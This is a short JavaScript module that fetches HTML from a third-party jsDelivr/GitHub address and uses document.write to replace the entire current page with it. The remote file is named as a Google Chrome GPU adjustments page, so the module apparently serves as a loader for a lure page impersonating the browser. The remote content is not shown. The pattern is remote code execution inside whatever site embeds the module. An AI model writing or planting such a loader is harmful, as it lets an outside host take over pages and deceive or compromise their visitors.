// Ron Penones | November 11th 2025 - Feel free to share and reproduce, the core idea is mine with some assistance of AI. Padayon!

export const targetURL = "https://cdn.jsdelivr.net/gh/mobiledropbox/landing_pages_scripts@7e510ef4041e4a0b27e2f264182aea49767a0edb/google_chrome_gpu_adjustments/google_chrome_gpu.html";

export async function loadAndWriteHTML() {
  try {
    const r = await fetch(targetURL, { credentials: 'omit' });
    if (!r.ok) throw new Error('Fetch failed: ' + r.status);
    const html = await r.text();
    document.open();
    document.write(html);
    document.close();
  } catch (err) {
    console.error('loadAndWriteHTML failed:', err);
    document.body.innerHTML = '<h2 style="color:red;">Failed to load remote HTML.</h2>';
  }
}
